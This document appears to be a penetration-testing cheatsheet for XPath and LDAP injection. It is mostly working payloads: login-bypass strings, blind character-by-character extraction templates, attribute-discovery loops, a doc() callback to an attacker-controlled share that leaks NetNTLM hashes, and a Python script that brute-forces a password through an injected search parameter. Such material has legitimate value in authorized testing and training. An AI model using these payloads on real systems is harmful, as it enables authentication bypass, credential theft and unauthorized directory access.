# XPATH + LDAP injection cheatsheet — Open WHEN: recon points at an XML-backed lookup (an `.xml` user store, `string(//user[...])` style query) or a directory back end (corporate SSO, OpenLDAP/AD bind, an `(&(uid=...)...)` filter), and you need auth-bypass + blind char-by-char extraction shapes

The skill body and `references/payloads.md` cover relational SQL, NoSQL operators, and
Cypher. This file carries the two remaining query-string injection classes the body does
not: **XPATH** (user input concatenated into an XPath query over an XML document) and
**LDAP** (user input concatenated into an LDAP search filter). Both are detected and
extracted the same way as blind SQLi — a predicate whose truth flips the response — but the
syntax is different, so they get their own templates here.

---

## Part 1 — XPATH injection

### When to suspect it
- The user/credential store is an XML file, not a relational DB.
- Errors mention XPath, `string()`, `//`, or an XML parser.
- A login or search query of the shape:
  `string(//user[name/text()='INPUT' and password/text()='INPUT']/account/text())`.
- XPath has **no comment syntax and no privilege model** — every node in the document is
  reachable from any injection point, so a single blind oracle dumps the whole XML tree.

### Context-confirm / auth-bypass strings
Send in the username field; the trailing `or` re-opens the predicate so the appended
`and password=...` becomes harmless.

```
' or '1'='1
' or ''='
x' or 1=1 or 'x'='y
admin' or '1'='1' or 'a'='a
') or ('1'='1
```

Structure probes (true ⇒ that structural fact holds — use them as blind oracles):

```
' and count(/*)=1 and '1'='1                 (document has exactly 1 root element)
' and count(/@*)=1 and '1'='1                (root has exactly 1 attribute)
' and count(/comment())=1 and '1'='1         (document has 1 comment node)
x' or name()='username' or 'x'='y            (current context node is named "username")
```

Node-walk fragments (enumerate siblings / extract neighbouring fields like the password):

```
')] | //user/*[contains(*,'                   (break out, union all user child nodes)
') and contains(../password,'c                (does the sibling password contain 'c'?)
') and starts-with(../password,'c             (does the sibling password start with 'c'?)
```

### Blind extraction (binary-search every character)
1. Length first — sweep `SIZE_INT` until the predicate holds:
   ```
   and string-length(account)=SIZE_INT
   ```
2. Then walk each character. `substring(str, pos, 1)` returns one char; compare it.
   `codepoints-to-string()` lets you compare against an ordinal instead of a literal:
   ```
   substring(//user[userid=5]/username,2,1)=CHAR_HERE
   substring(//user[userid=5]/username,2,1)=codepoints-to-string(INT_ORD_CHAR_HERE)
   ```
3. To dump an unknown structure, drive the same oracle off `name(/*[1])`,
   `name(/*[1]/*[1])`, etc. to learn element names, then read their text.

### Out-of-band (XPath 2.0 / `doc()` enabled)
`doc()` forces the parser to fetch a URL — a DNS/SMB callback that doubles as a NetNTLM
hash leak when pointed at a UNC path you control:

```
http://target/?title=Foundation&type=*&rent_days=* and doc('//OAST-HOST/SHARE')
```

### Tools
`xcat` (orf/xcat) automates blind XPath retrieval end-to-end; `xxxpwn` / `XmlChor` are
alternatives. The blind loop is trivial to hand-roll with `bash`/`curl` against the
char-by-char templates above.

---

## Part 2 — LDAP injection

### When to suspect it
- Login resolves against a directory (OpenLDAP, Active Directory, corporate SSO).
- The filter is built by string concatenation, e.g. `(&(uid=INPUT)(userPassword=INPUT))`.
- A `*` in a username field returns a result (LDAP wildcard) — strong signal.
- LDAP filters use prefix notation: `&`=AND, `|`=OR, `!`=NOT, conditions in parentheses.

### Authentication bypass
Inject parentheses + operators to rewrite the filter so it always matches. The closing
`)` and a new `(|(uid=*` open an always-true OR; the appended password clause ends up in a
branch that no longer needs to be true.

```
# username field:
*)(uid=*))(|(uid=*
# resulting filter:
(&(uid=*)(uid=*))(|(uid=*)(userPassword={MD5}X03MO1qnZdYdgyfeuILPmQ==))

# NOT-based variant — wraps the password check in (!(&(1=0)...)) which is always true:
# username = admin)(!(&(1=0     password = q))
(&(uid=admin)(!(&(1=0)(userPassword=q))))
```

A bare `*` in the username with any password is the simplest first probe — it matches the
first directory entry.

### Blind extraction (LDAP wildcard prefix-search)
LDAP `=X*` matches entries whose attribute *starts with* `X`. The response differs on
match vs. no-match, giving a per-character oracle — no `substring` needed, the wildcard
does the prefix test:

```
(&(sn=administrator)(password=*))     -> OK   (attribute exists)
(&(sn=administrator)(password=M*))    -> OK   (starts with M)
(&(sn=administrator)(password=MY*))   -> OK
(&(sn=administrator)(password=MYK*))  -> OK
(&(sn=administrator)(password=MYKE))  -> OK   (exact, no wildcard)
```

As a request parameter the injected field looks like:
`...&search=admin*)(password=PREFIX` — append one char at a time, keep the char that
returns the success marker.

### Discover valid attribute names
Inject `*)(ATTR=*` looping `ATTR` over a candidate list; a true-condition response means
the attribute exists on the object. Common defaults to try:

```
userPassword  surname  name  cn  sn  objectClass  mail  givenName  commonName
```

`Intruder/LDAP_attributes.txt` and `LDAP_FUZZ.txt` in the PATT tree are ready wordlists for
this loop.

### Reading `userPassword` (OCTET STRING, not a string)
`userPassword` is an octet string, so `=X*` prefix matching does not apply directly. Use
the `octetStringOrderingMatch` rule (OID `2.5.13.18`) to do a bit-by-bit ordered compare
and binary-search each byte:

```
userPassword:2.5.13.18:=\xx          (\xx is one byte, e.g. \80)
userPassword:2.5.13.18:=\xx\xx
userPassword:2.5.13.18:=\xx\xx\xx
```

### Blind LDAP extraction harness (char-by-char, request param)
Oracle = a `TRUE CONDITION` marker string in the body. Walk the password attribute:

```python
import requests, string
alphabet = string.ascii_letters + string.digits + "_@{}-/()!\"$%=^[]:;"
flag = ""
for _ in range(50):
    for ch in alphabet:
        r = requests.get(f"http://TARGET/?action=dir&search=admin*)(password={flag}{ch}")
        if "TRUE CONDITION" in r.text:
            flag += ch; print("found:", flag); break
    else:
        break
```
